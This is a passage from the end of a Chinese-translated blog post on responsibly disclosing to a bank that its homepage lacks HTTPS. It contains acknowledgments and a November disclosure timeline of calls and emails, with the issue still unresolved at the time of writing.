class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">此外，如果你是不使用HTTPS作为主页的银行或其他机构的用户，请与他们分享这篇文章——确保你的帐户安全是他们的责任，这是他们为确保你的凭据安全所能做的最起码的事情。</p><p id="a5e4" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">最后，我想对我的朋友<a class="ae li" href="https://twitter.com/inbarraz" rel="noopener ugc nofollow" target="_blank"> Inbar Raz </a>和Matan Scharf表示感谢，他们在披露过程中提供了帮助，并为这篇文章的组织和展示提供了出色的建议和投入。</p></div><div class="ab cl na nb go nc" role="separator"><span class="nd bw bk ne nf ng"/><span class="nd bw bk ne nf ng"/><span class="nd bw bk ne nf"/></div><div class="ha hb hc hd he"><h2 id="2084" class="ki kj hh bd kk kl km kn ko kp kq kr ks jf kt ku kv jj kw kx ky jn kz la lb lc bi translated">披露时间表和流程</h2><p id="adbe" class="pw-post-body-paragraph iw ix hh iy b iz ld ii jb jc le il je jf lf jh ji jj lg jl jm jn lh jp jq jr ha bi translated">11月7日，我第一次通过电话联系了该银行的CSO，并向他解释了这个问题，以及为什么我认为这会使该银行的用户面临风险。</p><p id="3088" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">11月9日，我向银行的反滥用团队发送了一封电子邮件，详细说明了这个问题，并概述了一个可能的攻击场景。</p><p id="13c1" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">11月24日，我联系了虐待团队，确认他们收到了我之前的电子邮件。他们证实收到了我的信，并说这个问题正在调查中。</p><p id="6828" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">最后，在11月30日，我再次检查，发现这个问题还没有得到解决，所以我给他们发了另一封电子邮件，提供帮助解决这个问题。我还更新了它们，因为我打算发表一篇博文来解释这个问题，并为用户提供补救技巧。</p><p id="0126" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">在撰写本文时，我还没有收到银行方面关于他们预计何时解决这个问题的消息。</p></div></div>    
</body>
</html>